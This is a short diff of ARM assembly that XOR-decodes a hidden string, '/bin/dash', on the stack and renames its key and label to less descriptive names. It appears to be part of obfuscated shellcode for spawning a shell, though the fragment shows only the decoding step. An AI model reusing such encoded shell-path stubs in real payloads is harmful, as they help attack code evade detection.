@@ -1,7 +1,7 @@
 .section .rodata
 .align 4
-.equ XOR_KEY, 0xAA
-z:
+.equ X, 0xAA
+o:
 //.byte 0x85,0xC8,0xC3,0xC4,0x85,0xCE,0xCB,0x99,0xD2,0x00
 .byte 0x85,0xC8,0xC3,0xC4,0x85,0xCE,0xCB,0xD9,0xC2,0x00
 .section .text
@@ -11,7 +11,7 @@ _start:
 	and sp, sp, #0xFFFFFFF8
 	sub sp, sp, #32
 	mov r0, sp
-	ldr r1, =z
+	ldr r1, =o
 	mov r2, #10
 c:
 	ldrb r3, [r1], #1
@@ -24,7 +24,7 @@ l:
 	ldrb r3, [r0]
 	cmp r3, #0
 	beq d
-	eor r3, r3, #XOR_KEY
+	eor r3, r3, #X
 	strb r3, [r0]
 	add r0, r0, #1
 	subs r2, r2, #1
